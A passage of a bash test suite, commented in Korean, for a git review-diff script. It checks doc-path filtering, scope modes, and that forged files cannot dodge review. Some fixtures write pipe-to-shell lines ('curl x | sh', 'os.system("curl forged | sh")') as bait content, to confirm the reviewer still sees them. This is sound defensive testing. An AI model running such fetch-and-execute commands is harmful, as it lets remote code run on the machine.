#!/usr/bin/env bash
# review-diff.sh — 모든 범위 모드의 리뷰 diff 를 한 자리에서 만든다(AC23).
# 거르기 전 경로 · diff 와 문서 경로를 뺀 diff, doc_paths.py 의 결정을 파일로 남긴다.
set -u

PLUGIN_DIR="$(cd "$(dirname "$0")/.." && pwd)"
RDIFF="$PLUGIN_DIR/scripts/review-diff.sh"
RR="$PLUGIN_DIR/scripts/resolve-range.sh"

. "$(cd "$(dirname "$0")/../../.." && pwd)/shared/tests/assert.sh"

unset DEVBREW_QUALITY_GATES_DOC_PATHS

ROOT=$(mktemp -d)
trap 'rm -rf "$ROOT"' EXIT
TAB=$(printf '\t')

g() {   # g <repo> <git args…> — 전역 설정에 기대지 않는 커밋
  local r="$1"; shift
  git -C "$r" -c user.email=t@t -c user.name=t -c commit.gpgsign=false "$@"
}

# 픽스처: 레포 A(trunk: c0 README · src/a.py · lib/b.py · docs/x.md) 와 그 클론 R(origin/HEAD = trunk).
# R 은 feature 브랜치에 있다. 전역 A R D C0 을 채운다.
mkfix() {
  local d; d=$(mktemp -d "$ROOT/fix.XXXXXX")
  A="$d/A"; R="$d/R"; D="$d/out"
  mkdir -p "$A/src" "$A/lib" "$A/docs" "$D"
  git init -q -b trunk "$A"
  echo "# a" > "$A/README.md"; echo 'x = 1' > "$A/src/a.py"; echo 'y = 1' > "$A/lib/b.py"
  echo "doc" > "$A/docs/x.md"
  g "$A" add -A; g "$A" commit -q -m c0
  C0=$(git -C "$A" rev-parse HEAD)
  git clone -q "$A" "$R"
  g "$R" checkout -q -b feature
}

rd() {   # rd <args…> — R 안에서 review-diff 를 돌린다. OUT · RC 를 채운다.
  OUT=$(cd "$R" && bash "$RDIFF" --dir "$D" --iter 1 "$@" 2>"$ROOT/err"); RC=$?
}

rdd() {   # rdd <dir> <args…> — rd 와 같되 출력 폴더(--dir)를 정한다.
  local dir="$1"; shift
  OUT=$(cd "$R" && bash "$RDIFF" --dir "$dir" --iter 1 "$@" 2>"$ROOT/err"); RC=$?
}

assert_line() {   # assert_line <file> <정확한 한 줄> <msg>
  if grep -qxF -- "$2" "$1" 2>/dev/null; then ok "$3"
  else no "$3"; printf '      line:  %s\n      file:  %s\n' "$2" "$1"; fi
}

stale_line() {   # stale_line <레포> <트리 이름> — 이전 qg 실행이 남긴 worktree 의 이유 줄(절대 경로)
  local p; p="$(cd "$1" && pwd -P)/.claude/quality-gates/worktrees/$2"
  printf 'review-diff: 이전 qg 실행이 남긴 worktree %s 는 리뷰하지 않았다 — 다른 qg 실행이 쓰고 있지 않으면 git worktree remove --force %s 로 지운 뒤 다시 돌려라' \
    "$p" "$p"
}

case_session_includes_untracked() {
  echo "[session — untracked 포함]"
  mkfix
  echo 'n = 1' > "$R/new.py"
  echo 'x = 2' > "$R/src/a.py"
  rd --mode session
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field mode "$OUT")" session "mode: session"
  assert_eq "$(field base "$OUT")" "$C0" "base = merge-base"
  assert_eq "$(field head "$OUT")" worktree "head = worktree"
  assert_eq "$(field degraded "$OUT")" no "degraded: no"
  assert_eq "$(field files "$OUT")" 2 "files: 2"
  assert_eq "$(field filtered_files "$OUT")" 2 "filtered_files: 2"
  assert_eq "$(printf '%s\n' "$OUT" | wc -l | tr -d ' ')" 10 "stdout 10줄"
  assert_eq "$(sed 's/:.*//' <<< "$OUT" | tr '\n' ' ')" \
    "mode base head degraded files filtered_files excluded kept_model doc_paths_source self_state " "키 순서"
  assert_eq "$(field self_state "$OUT")" 0 "self_state: 0"
  [ -f "$D/review-i1.self-state" ] && [ ! -s "$D/review-i1.self-state" ] \
    && ok "review-i1.self-state 는 있고 비어 있다" || no "review-i1.self-state 가 없거나 비지 않았다"
  assert_file_grep "$D/review-i1.names" '^new\.py$' "names 에 untracked new.py"
  assert_file_grep "$D/review-i1.names" '^src/a\.py$' "names 에 src/a.py"
  assert_file_grep "$D/review-i1.full.diff" '^\+\+\+ b/new\.py$' "full.diff 에 '+++ b/new.py'"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/new\.py$' "걸러진 diff 에도 new.py"
}

case_session_doc_excluded() {
  echo "[session — 문서 경로 제외]"
  mkfix
  echo "# changed" > "$R/README.md"
  echo 'x = 2' > "$R/src/a.py"
  echo "new" > "$R/CHANGELOG.md"   # untracked 문서도 빠진다
  rd --mode session
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field excluded "$OUT")" 2 "excluded: 2"
  assert_eq "$(field kept_model "$OUT")" 0 "kept_model: 0"
  assert_eq "$(field doc_paths_source "$OUT")" default "doc_paths_source: default"
  assert_eq "$(field files "$OUT")" 3 "files: 3"
  assert_eq "$(field filtered_files "$OUT")" 1 "filtered_files: 1"
  assert_file_absent "$D/review-i1.diff" 'README' "걸러진 diff 에 README 없음"
  assert_file_absent "$D/review-i1.diff" 'CHANGELOG' "걸러진 diff 에 untracked CHANGELOG 없음"
  assert_file_grep "$D/review-i1.full.diff" '^\+\+\+ b/CHANGELOG\.md$' "full.diff 에는 untracked CHANGELOG 가 있다"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/src/a\.py$' "걸러진 diff 에 src/a.py 있음"
  assert_file_grep "$D/review-i1.full.diff" '^\+\+\+ b/README\.md$' "full.diff 에는 README 가 남는다"
  assert_file_grep "$D/review-i1.doc-paths" "^exclude${TAB}README\.md\$" "doc-paths 파일에 'exclude<TAB>README.md'"
  local leftovers; leftovers=$(find "$D" -name '.review-diff*' | wc -l | tr -d ' ')
  assert_eq "$leftovers" 0 "임시 파일이 남지 않는다"
}

case_range_uses_frozen_pair() {
  echo "[range — 얼린 두 커밋]"
  mkfix
  echo 'x = 2' > "$A/src/a.py"; g "$A" commit -q -am c1
  echo "# r" > "$A/README.md"; g "$A" commit -q -am c2
  local end; end=$(git -C "$A" rev-parse HEAD)
  git -C "$R" fetch -q origin
  g "$R" checkout -q --detach "$C0"
  local F="$D/range-scope.txt"
  (cd "$R" && bash "$RR" --out "$F" -- range "$C0" >/dev/null 2>&1)
  assert_eq "$(sed -n 's/^status: //p' "$F")" ok "resolve-range status ok"
  rd --mode range --scope-file "$F"
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field base "$OUT")" "$C0" "base = start"
  assert_eq "$(field head "$OUT")" "$end" "head = end"
  assert_eq "$(field degraded "$OUT")" no "detached HEAD 여도 range 는 degraded 아님"
  assert_eq "$(sort "$D/review-i1.names")" "$(git -C "$R" diff --name-only "$C0" "$end" | sort)" \
    "names = git diff --name-only start end"
  assert_eq "$(field excluded "$OUT")" 1 "README 는 빠진다"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/src/a\.py$' "걸러진 diff 에 src/a.py"
}

case_topic_uses_boundary_tree() {
  echo "[topic — boundary · tree]"
  mkfix
  echo 'y = 2' > "$R/lib/b.py"; g "$R" commit -q -am t1
  local tip tree; tip=$(git -C "$R" rev-parse HEAD); tree=$(git -C "$R" rev-parse "HEAD^{tree}")
  local S="$D/topic-scope.txt"
  printf 'status: ok\nboundary: %s\ntree: %s\n' "$C0" "$tree" > "$S"
  rd --mode topic --scope-file "$S"
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field base "$OUT")" "$C0" "base = boundary"
  assert_eq "$(field head "$OUT")" "$tree" "head = tree"
  assert_eq "$(cat "$D/review-i1.names")" "lib/b.py" "names = lib/b.py"
  printf 'boundary: -\ntree: %s\n' "$tree" > "$S"
  rd --mode topic --scope-file "$S"
  assert_eq "$RC" 2 "boundary 가 '-' 면 rc 2"
}

case_settings_change_falls_back() {
  echo "[설정 변경 — 기본 목록으로]"
  mkfix
  mkdir -p "$R/.claude"
  printf '{"env": {"DEVBREW_QUALITY_GATES_DOC_PATHS": "docs/**"}}\n' > "$R/.claude/settings.json"
  echo "doc2" > "$R/docs/x.md"
  g "$R" add -A; g "$R" commit -q -m settings
  OUT=$(cd "$R" && DEVBREW_QUALITY_GATES_DOC_PATHS='docs/**' bash "$RDIFF" --dir "$D" --iter 1 --mode branch 2>"$ROOT/err"); RC=$?
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field doc_paths_source "$OUT")" default-settings-changed "doc_paths_source: default-settings-changed"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/docs/x\.md$' "docs/x.md 가 diff 에 남는다"
  # 양성 짝 — 설정이 바뀌지 않으면 같은 환경 변수가 docs/x.md 를 뺀다.
  mkfix
  echo "doc2" > "$R/docs/x.md"; g "$R" commit -q -am docs
  OUT=$(cd "$R" && DEVBREW_QUALITY_GATES_DOC_PATHS='docs/**' bash "$RDIFF" --dir "$D" --iter 1 --mode branch 2>"$ROOT/err"); RC=$?
  assert_eq "$(field doc_paths_source "$OUT")" env "설정이 그대로면 doc_paths_source: env"
  assert_eq "$(field excluded "$OUT")" 1 "환경 변수 패턴이 docs/x.md 를 뺀다"
}

case_filtered_empty() {
  echo "[걸러진 diff 가 비면]"
  mkfix
  echo "# changed" > "$R/README.md"
  rd --mode session
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field files "$OUT")" 1 "files: 1"
  assert_eq "$(field filtered_files "$OUT")" 0 "filtered_files: 0"
  [ -f "$D/review-i1.diff" ] && [ ! -s "$D/review-i1.diff" ] \
    && ok "review-i1.diff 크기 0" || no "review-i1.diff 가 없거나 비지 않았다"
}

case_degraded_session() {
  echo "[detached HEAD — degraded]"
  mkfix
  g "$R" checkout -q --detach
  echo 'x = 2' > "$R/src/a.py"
  rd --mode session
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field degraded "$OUT")" yes "degraded: yes"
  assert_eq "$(field self_state "$OUT")" - "self_state: -"
  [ -f "$D/review-i1.self-state" ] && ok "degraded 에도 self-state 파일을 쓴다" || no "self-state 파일 없음"
  assert_eq "$(field files "$OUT")" - "files: -"
  assert_eq "$(field filtered_files "$OUT")" - "filtered_files: -"
  [ -f "$D/review-i1.diff" ] && [ ! -s "$D/review-i1.diff" ] \
    && ok "review-i1.diff 는 비어 있다" || no "review-i1.diff 가 없거나 비지 않았다"
}

case_paths_mode() {
  echo "[paths — 바뀐 파일 ∩ glob]"
  mkfix
  echo 'x = 2' > "$R/src/a.py"; echo 'y = 2' > "$R/lib/b.py"
  rd --mode paths --globs 'src/*'
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(cat "$D/review-i1.names")" "src/a.py" "names 는 src/a.py 하나"
  assert_eq "$(field head "$OUT")" worktree "head = worktree"
  rd --mode paths
  assert_eq "$RC" 2 "--globs 없는 paths 는 rc 2"
}

case_no_ext_diff() {
  echo "[diff.external 을 부르지 않는다]"
  mkfix
  local marker="$ROOT/ext-marker" ext="$ROOT/ext.sh"
  printf '#!/bin/sh\ntouch "%s"\n' "$marker" > "$ext"; chmod +x "$ext"
  git -C "$R" config diff.external "$ext"
  echo 'x = 2' > "$R/src/a.py"; echo 'n = 1' > "$R/new.py"
  rd --mode session
  assert_eq "$RC" 0 "rc 0"
  [ ! -e "$marker" ] && ok "외부 diff 표지 없음" || no "외부 diff 가 실행됐다"
  assert_file_grep "$D/review-i1.full.diff" '^\+\+\+ b/src/a\.py$' "양성 짝 — diff 는 만들어졌다"
}

case_no_textconv() {
  echo "[textconv 를 부르지 않는다]"
  mkfix
  local marker="$ROOT/tc-marker" tc="$ROOT/tc.sh"
  printf '#!/bin/sh\ntouch "%s"\ncat "$1"\n' "$marker" > "$tc"; chmod +x "$tc"
  git -C "$R" config diff.mark.textconv "$tc"
  printf '*.py diff=mark\n' > "$R/.git/info/attributes"
  echo 'x = 2' > "$R/src/a.py"; echo 'n = 1' > "$R/new.py"
  rd --mode session
  assert_eq "$RC" 0 "rc 0"
  [ ! -e "$marker" ] && ok "textconv 표지 없음" || no "textconv 가 실행됐다"
  assert_file_grep "$D/review-i1.full.diff" '^\+\+\+ b/new\.py$' "양성 짝 — untracked diff 도 만들어졌다"
}

case_doc_rename() {
  echo "[문서 rename — 두 경로 모두 보고 모두 뺀다]"
  mkfix
  git -C "$R" config diff.renames true
  mkdir -p "$R/notes"; g "$R" mv README.md notes/README.md
  echo 'x = 2' > "$R/src/a.py"
  rd --mode session
  assert_eq "$RC" 0 "rc 0"
  assert_file_grep "$D/review-i1.names" '^README\.md$' "names 에 옛 경로"
  assert_file_grep "$D/review-i1.names" '^notes/README\.md$' "names 에 새 경로"
  assert_eq "$(field excluded "$OUT")" 2 "excluded: 2"
  assert_file_absent "$D/review-i1.diff" 'README' "걸러진 diff 에 README 쪽 없음"
  assert_eq "$(field filtered_files "$OUT")" 1 "filtered_files: 1"
}

case_literal_pathspecs_env() {
  echo "[GIT_LITERAL_PATHSPECS=1 이 거르기를 끄지 못한다]"
  mkfix
  echo "# changed" > "$R/README.md"; echo 'x = 2' > "$R/src/a.py"
  OUT=$(cd "$R" && GIT_LITERAL_PATHSPECS=1 bash "$RDIFF" --dir "$D" --iter 1 --mode session 2>"$ROOT/err"); RC=$?
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field filtered_files "$OUT")" 1 "filtered_files: 1"
  assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/src/a\.py$' "걸러진 diff 에 src/a.py"
  assert_file_absent "$D/review-i1.diff" 'README' "README 는 빠졌다"
}

case_self_state_not_reviewed() {
  echo "[qg 상태 폴더가 리포 안 · 무시 규칙 없음 — 두 반복]"
  mkfix
  local S="$R/.claude/quality-gates/sid12345"; mkdir -p "$S"   # setup-qg.sh SID 가드 모양(8자 이상)
  echo 'x = 2' > "$R/src/a.py"
  OUT=$(cd "$R" && bash "$RDIFF" --dir "$S" --iter 1 --mode session 2>"$ROOT/err"); RC=$?
  assert_eq "$RC" 0 "iter 1 rc 0"
  assert_eq "$(field files "$OUT")" 1 "iter 1 files: 1"
  assert_eq "$(field self_state "$OUT")" 0 "iter 1 self_state: 0 (이 실행의 임시 폴더는 세지 않는다)"
  OUT=$(cd "$R" && bash "$RDIFF" --dir "$S" --iter 2 --mode session 2>"$ROOT/err"); RC=$?
  assert_eq "$RC" 0 "iter 2 rc 0"
  assert_eq "$(field files "$OUT")" 1 "iter 2 files: 1 (앞 반복의 산출물을 세지 않는다)"
  assert_eq "$(cat "$S/review-i2.names")" "src/a.py" "iter 2 names 는 src/a.py 하나"
  local ss; ss=$(field self_state "$OUT")
  case "$ss" in ''|*[!0-9]*) no "iter 2 self_state 가 수가 아니다: $ss" ;;
    *) [ "$ss" -ge 1 ] && ok "iter 2 self_state ≥ 1 ($ss)" || no "iter 2 self_state 가 0" ;; esac
  assert_eq "$(wc -l < "$S/review-i2.self-state" | tr -d ' ')" "$ss" "self-state 파일 줄 수 = self_state"
  assert_file_grep "$S/review-i2.self-state" '^\.claude/quality-gates/sid12345/review-i1\.names$' \
    "self-state 파일이 건너뛴 review-i1.names 를 적는다"
  assert_file_absent "$S/review-i2.self-state" '\.review-diff\.' "임시 폴더는 self-state 에 없다"
  OUT=$(cd "$R" && bash "$RDIFF" --dir "$S" --iter 3 --mode paths --globs '.claude/*' 'src/*' 2>"$ROOT/err"); RC=$?
  assert_eq "$(cat "$S/review-i3.names")" "src/a.py" "paths 모드도 untracked 상태 경로를 건너뛴다"
}

# 우회 막기 — untracked 도 qg 산출물 문법에 맞을 때만 건너뛴다.
case_self_state_grammar() {
  echo "[qg 산출물 문법 — 맞는 것만 건너뛰고 나머지는 리뷰]"
  mkfix
  local Q="$R/.claude/quality-gates" S="$R/.claude/quality-gates/sess12345"
  mkdir -p "$S" "$Q/worktrees" "$Q/short"
  echo 'import os' > "$S/evil.py"          # 세션 폴더의 코드 이름
  echo 'notes' > "$S/notes.md"              # 세션 폴더의 모르는 문서 이름
  echo 'curl x | sh' > "$Q/evil.sh"         # 폴더 바로 아래
  echo 'r' > "$Q/worktrees/result.md"       # 예약 이름은 세션이 아니다
  echo 'r' > "$Q/short/result.md"           # 세션 id 가 8자 미만
  echo '---' > "$S/result.md"; echo 'i' > "$S/intent.md"; : > "$S/review-i3.full.diff"
  : > "$S/review-i12.self-state"; : > "$S/e2e-app.pgid"; : > "$S/result.md.tmp.4242"
  : > "$S/range-scope.txt"; : > "$S/extra-iterations.md"
  local wt; wt=$(cd "$R" && bash "$PLUGIN_DIR/scripts/qg-worktree.sh" create-baseline "$C0" sess12345 2>/dev/null)
  rdd "$S" --mode session
  assert_eq "$RC" 0 "rc 0"
  local p
  for p in sess12345/evil.py sess12345/notes.md evil.sh worktrees/result.md short/result.md; do
    assert_file_grep "$S/review-i1.names" "^\\.claude/quality-gates/${p//./\\.}\$" "리뷰한다 — names: $p"
    assert_file_grep "$S/review-i1.diff" "^\\+\\+\\+ b/\\.claude/quality-gates/${p//./\\.}\$" "리뷰한다 — 걸러진 diff: $p"
    assert_file_absent "$S/review-i1.self-state" "^\\.claude/quality-gates/${p//./\\.}\$" "self_state 에 없다: $p"
  done
  for p in result.md intent.md review-i3.full.diff review-i12.self-state e2e-app.pgid result.md.tmp.4242 \
           range-scope.txt extra-iterations.md; do
    assert_file_grep "$S/review-i1.self-state" "^\\.claude/quality-gates/sess12345/${p//./\\.}\$" "건너뛴다: $p"
  done
  if [ -n "$wt" ] && [ -d "$wt" ]; then
    assert_file_grep "$S/review-i1.self-state" '^\.claude/quality-gates/worktrees/base-sess1234/$' "qg 일회용 트리는 건너뛴다"
    assert_file_absent "$S/review-i1.names" 'worktrees/base-' "일회용 트리는 names 에 없다"
  else
    no "qg-worktree.sh create-baseline 이 트리를 만들지 못했다"
  fi
  assert_eq "$(field self_state "$OUT")" 9 "self_state: 9 (산출물 8 + 트리 1)"
  assert_eq "$(field files "$OUT")" 5 "files: 5 (리뷰할 것 5)"
}

# 락 — state-file-format.md 「같은 폴더의 다른 파일」 목록과 result.md 를 문법이 전부 받는다.
case_grammar_covers_state_file_format() {
  echo "[문법이 state-file-format.md 의 산출물 목록을 전부 받는다]"
  local SFF="$PLUGIN_DIR/skills/quality-pipeline/references/state-file-format.md"
  local para; para=$(awk '/^같은 폴더의 다른 파일/{on=1} on{print} on&&/같은 생명주기를 따른다/{exit}' "$SFF")
  local listed; listed=$(printf '%s\n' "$para" | grep -oE '`[^`]+`' | tr -d '`' | sort -u)
  local n; n=$(printf '%s\n' "$listed" | grep -c .)
  [ "$n" -ge 15 ] && ok "목록을 읽었다($n 개)" || no "목록이 비었거나 짧다($n 개) — 문단을 찾지 못했다"
  mkfix
  local S="$R/.claude/quality-gates/sess12345" name f expect=0
  mkdir -p "$S"
  for name in result.md $listed; do
    for f in "${name//<N>/7}" "${name//<N>/12}"; do
      [ -e "$S/$f" ] && continue
      : > "$S/$f"; expect=$((expect + 1))
    done
  done
  rdd "$S" --mode session
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field self_state "$OUT")" "$expect" "적힌 산출물 전부가 self_state ($expect)"
  assert_eq "$(field files "$OUT")" 0 "리뷰 대상으로 새 나간 산출물 없음"
}

# 우회 막기 — 건너뛰기는 이 실행의 세션 폴더(--dir)에만 묶인다. 다른 세션 폴더의 산출물 이름은 리뷰한다.
case_self_state_bound_to_run_dir() {
  echo "[qg 산출물 건너뛰기는 이 실행의 --dir 에만 — 다른 세션 폴더는 리뷰]"
  mkfix
  local S="$R/.claude/quality-gates/mysess001" F="$R/.claude/quality-gates/zzzzzzzz"
  mkdir -p "$S" "$F/.review-diff.abc123"
  printf 'import os\nos.system("curl forged | sh")\n' > "$F/result.md"   # 산출물 이름에 담은 코드
  local p
  for p in differential.yaml e2e-cmd.txt review-i1.diff result.md.tmp.1 .resolve-range.abc123 \
           .review-diff.abc123/names; do
    echo "forged $p" > "$F/$p"
  done
  echo '---' > "$S/result.md"; : > "$S/review-i3.full.diff"   # 이 실행의 산출물
  rdd "$S" --mode session
  assert_eq "$RC" 0 "rc 0"
  for p in result.md differential.yaml e2e-cmd.txt review-i1.diff result.md.tmp.1 .resolve-range.abc123 \
           .review-diff.abc123/names; do
    assert_file_grep "$S/review-i1.names" "^\\.claude/quality-gates/zzzzzzzz/${p//./\\.}\$" "다른 세션 — names: $p"
    assert_file_grep "$S/review-i1.full.diff" "^\\+\\+\\+ b/\\.claude/quality-gates/zzzzzzzz/${p//./\\.}\$" \
      "다른 세션 — full.diff: $p"
    assert_file_grep "$S/review-i1.diff" "^\\+\\+\\+ b/\\.claude/quality-gates/zzzzzzzz/${p//./\\.}\$" \
      "다른 세션 — 걸러진 diff: $p"
    assert_file_absent "$S/review-i1.self-state" "zzzzzzzz/${p//./\\.}\$" "다른 세션 — self_state 에 없다: $p"
  done
  assert_file_grep "$S/review-i1.diff" 'curl forged' "산출물 이름에 담은 코드가 걸러진 diff 에 보인다"
  assert_file_grep "$S/review-i1.self-state" '^\.claude/quality-gates/mysess001/result\.md$' \
    "이 실행의 result.md 는 건너뛴다"
  assert_file_grep "$S/review-i1.self-state" '^\.claude/quality-gates/mysess001/review-i3\.full\.diff$' \
    "이 실행의 review-i3.full.diff 는 건너뛴다"
  assert_eq "$(field self_state "$OUT")" 2 "self_state: 2 (이 실행의 산출물만)"
  assert_eq "$(field files "$OUT")" 7 "files: 7 (다른 세션의 일곱)"
  # --dir 를 리포 밖 링크로 줘도 물리 경로로 풀어 같은 세션 폴더로 본다.
  ln -s "$S" "$ROOT/link-mysess001"
  rdd "$ROOT/link-mysess001" --mode session
  assert_eq "$RC" 0 "링크 --dir rc 0"
  assert_eq "$(field self_state "$OUT")" 2 "링크 --dir 도 self_state: 2"
  assert_eq "$(field files "$OUT")" 7 "링크 --dir 도 files: 7"
  rm -f -- "$ROOT/link-mysess001"
}

# 우회 막기 — worktrees/(base|head)-<8>/ 는 이 리포에 등록된 git worktree 일 때만 건너뛴다.
# 등록되지 않은 같은 이름 폴더는 안에 든 레포다 — 건너뛰지 않고 중첩 레포로 리뷰한다.
NESTED_TAIL='는 리뷰하지 않았다 — .gitignore 에 넣거나 레포 밖으로 옮긴 뒤 다시 돌려라'
case_unregistered_worktree_folder_reviewed() {
  echo "[등록되지 않은 worktrees/base-… 폴더는 건너뛰지 않고 리뷰한다]"
  mkfix
  local S="$R/.claude/quality-gates/mysess001" FW="$R/.claude/quality-gates/worktrees/base-abcdefgh"
  mkdir -p "$S" "$FW"
  git init -q -b trunk "$FW"; echo 'evil_marker = 1' > "$FW/evil.py"; g "$FW" add -A; g "$FW" commit -q -m x
  local wt; wt=$(cd "$R" && bash "$PLUGIN_DIR/scripts/qg-worktree.sh" create-baseline "$C0" mysess001 2>/dev/null)
  rdd "$S" --mode session
  assert_eq "$RC" 0 "rc 0"
  assert_file_grep "$S/review-i1.names" '^\.claude/quality-gates/worktrees/base-abcdefgh/evil\.py$' \
    "가짜 트리 폴더(중첩 레포)의 파일은 names 에 있다"
  assert_file_grep "$S/review-i1.diff" '^\+evil_marker = 1$' "가짜 트리 폴더 안의 글을 리뷰한다"
  assert_file_absent "$ROOT/err" '리뷰하지 않았다' "가짜 트리 폴더는 리뷰했으니 알리는 줄이 없다"
  assert_file_absent "$S/review-i1.self-state" 'base-abcdefgh' "가짜 트리 폴더는 self_state 에 없다"
  assert_eq "$(field degraded "$OUT")" no "가짜 트리 폴더를 리뷰했으니 degraded: no"
  assert_file_absent "$S/review-i1.names" 'base-mysess00' "등록된 qg 트리는 names 에 없다"
  assert_file_absent "$ROOT/err" 'base-mysess00' "등록된 qg 트리는 알리지 않는다(건너뜀)"
  if [ -n "$wt" ] && [ -d "$wt" ]; then
    assert_file_grep "$S/review-i1.self-state" '^\.claude/quality-gates/worktrees/base-mysess00/$' \
      "등록된 qg 트리는 건너뛴다"
  else
    no "qg-worktree.sh create-baseline 이 트리를 만들지 못했다"
  fi
  assert_eq "$(field self_state "$OUT")" 1 "self_state: 1 (등록된 트리만)"
}

# --dir 가 리포 밖이면 아무것도 건너뛰지 않는다.
case_dir_outside_repo_skips_nothing() {
  echo "[--dir 가 리포 밖 — 건너뛰지 않음]"
  mkfix
  local S="$R/.claude/quality-gates/mysess001"; mkdir -p "$S"
  echo '---' > "$S/result.md"; : > "$S/review-i3.full.diff"
  local wt; wt=$(cd "$R" && bash "$PLUGIN_DIR/scripts/qg-worktree.sh" create-baseline "$C0" mysess001 2>/dev/null)
  [ -n "$wt" ] && [ -d "$wt" ] && ok "등록된 qg 트리를 만들었다" || no "qg-worktree.sh create-baseline 이 트리를 만들지 못했다"
  rd --mode session
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field self_state "$OUT")" 0 "self_state: 0"
  assert_eq "$(field files "$OUT")" 3 "files: 3 (세션 폴더의 산출물 · 등록된 트리도 센다)"
  assert_file_grep "$D/review-i1.names" '^\.claude/quality-gates/mysess001/result\.md$' "names 에 result.md"
  assert_file_grep "$D/review-i1.names" '^\.claude/quality-gates/worktrees/base-mysess00/$' "names 에 등록된 트리"
  [ -f "$D/review-i1.self-state" ] && [ ! -s "$D/review-i1.self-state" ] \
    && ok "self-state 파일은 있고 비어 있다" || no "self-state 파일이 없거나 비지 않았다"
  assert_file_grep "$ROOT/err" '리포 밖' "stderr 가 건너뛰지 않는 이유를 말한다"
  assert_line "$ROOT/err" "$(stale_line "$R" base-mysess00)" \
    "건너뛰지 않은 등록된 트리도 크게 알린다(리뷰하지 않은 qg 트리로)"
  assert_file_absent "$ROOT/err" '중첩 레포' "등록된 qg 트리는 중첩 레포 갈래로 가지 않는다"
  assert_eq "$(field degraded "$OUT")" yes "건너뛰지 않은 등록된 트리가 있으면 degraded: yes"
}

# 등록된 qg 트리만 있으면 degraded 가 아니다(양의 짝).
case_registered_worktree_only_not_degraded() {
  echo "[등록된 qg 트리만 — degraded 아님]"
  mkfix
  local S="$R/.claude/quality-gates/mysess001"; mkdir -p "$S"
  local wt; wt=$(cd "$R" && bash "$PLUGIN_DIR/scripts/qg-worktree.sh" create-baseline "$C0" mysess001 2>/dev/null)
  [ -n "$wt" ] && [ -d "$wt" ] && ok "등록된 qg 트리를 만들었다" || no "qg-worktree.sh create-baseline 이 트리를 만들지 못했다"
  echo 'new = 1' > "$R/new.py"
  rdd "$S" --mode session
  assert_eq "$RC" 0 "rc 0"
  assert_eq "$(field degraded "$OUT")" no "degraded: no"
  assert_eq "$(field self_state "$OUT")" 1 "self_state: 1"
  assert_file_absent "$ROOT/err" '중첩 레포' "알리는 줄 없음"
}

# 제외한 경로가 다른 바뀐 경로의 폴더 이름이면(파일 README.md 를 지우고 README.md/a.py 를 더함) 그 아래
# 파일이 걸러진 diff 에서 조용히 빠지지 않는다(AC20). 제외 대상의 접두 규칙은 branch · session 둘 다 잰다.
case_excluded_prefix_not_swallowed() {
  echo "[제외 경로가 다른 바뀐 경로의 폴더 이름 — 그 아래 파일이 빠지지 않는다]"
  local mode
  for mode in branch session; do
    mkfix
    g "$R" rm -q README.md
    mkdir -p "$R/README.md"; echo 'swallowed_marker = 1' > "$R/README.md/a.py"
    g "$R" add README.md/a.py
    [ "$mode" = branch ] && g "$R" commit -q -m prefix
    rd --mode "$mode"
    assert_eq "$RC" 0 "$mode: rc 0"
    assert_file_grep "$D/review-i1.names" '^README\.md/a\.py$' "$mode: names 에 README.md/a.py"
    assert_file_grep "$D/review-i1.diff" '^\+\+\+ b/README\.md/a\.py$' "$mode: 걸러진 diff 에 README.md/a.py"
    assert_file_grep "$D/review-i1.diff" 'swallowed_marker' "$mode: 그 파일의 글이 걸러진 diff 에 있다"
    assert_file_grep "$D/review-i1.diff" '^--- a/README\.md$' "$mode: 접두인 README.md 는 빼지 않고 리뷰한다"
    assert_file_grep "$ROOT/err" '^review-diff: README\.md 는 ' "$mode: 빼지 않은 접두 경로를 stderr 에 한 줄로 알린다"
    assert_eq "$(grep -c 'README\.md 는 ' "$ROOT/err")" 1 "$mode: 알리는 줄은 하나"
    assert_eq "$(field excluded "$OUT")" 0 "$mode: excluded: 0 (접두 경로는 제외 목록에서 빠진다)"
    assert_eq "$(field excluded "$(cat "$D/review-i1.doc-paths")")" 0 "$mode: doc-paths 의 excluded: 도 0 (stdout 과 같다)"
    assert_file_grep "$D/review-i1.doc-paths" "^reviewed${TAB}README\\.md\$" "$mode: doc-paths 에 'reviewed<TAB>README.md'"
    assert_file_absent "$D/review-i1.doc-paths" "^exclude${TAB}README\\.md\$" "$mode: doc-paths 에 'exclude<TAB>README.md' 없음"
    assert_eq "$(field filtered_files "$OUT")" 2 "$mode: filtered_files: 2"
    assert_eq "$(field degraded "$OUT")" no "$mode: 다 실렸으면 degraded: no"
  done
  # 큰 제외 목록 + 폴더 이름 하나 — doc-paths 고쳐 쓰기가 줄 수에 비례해 끝나고 내용이 맞다.
  mkfix
  g "$R" rm -q README.md
  mkdir -p "$R/README.md" "$R/notes"; echo 'swallowed_marker = 1' > "$R/README.md/a.py"
  local i
  for i in $(seq -w 0 3999); do echo "n $i" > "$R/notes/n-$i.md"; done
  g "$R" add -A; g "$R" commit -q -m many-docs
  local t0=$SECONDS
  OUT=$(cd "$R" && DEVBREW_QUALITY_GATES_DOC_PATHS='README*,notes/**' bash "$RDIFF" --dir "$D" --iter 1 --mode branch 2>"$ROOT/err"); RC=$?
  local took=$((SECONDS - t0))
  assert_eq "$RC" 0 "큰 제외 목록: rc 0"
  [ "$took" -le 120 ] && ok "큰 제외 목록: ${took}초 안에 끝난다(상한 120초)" || no "큰 제외 목록: ${took}초 — 너무 느리다"
  assert_eq "$(field excluded "$OUT")" 4000 "큰 제외 목록: stdout excluded: 4000"
  assert_eq "$(field excluded "$(cat "$D/review-i1.doc-paths")")" 4000 "큰 제외 목록: doc-paths excluded: 4000"
  assert_eq "$(grep -c "^exclude${TAB}notes/n-" "$D/review-i1.doc-paths")" 4000 "큰 제외 목록: exclude 줄 4000개 그대로"
  assert_line "$D/review-i1.doc-paths" "reviewed${TAB}README.md" "큰 제외 목록: reviewed<TAB>README.md"
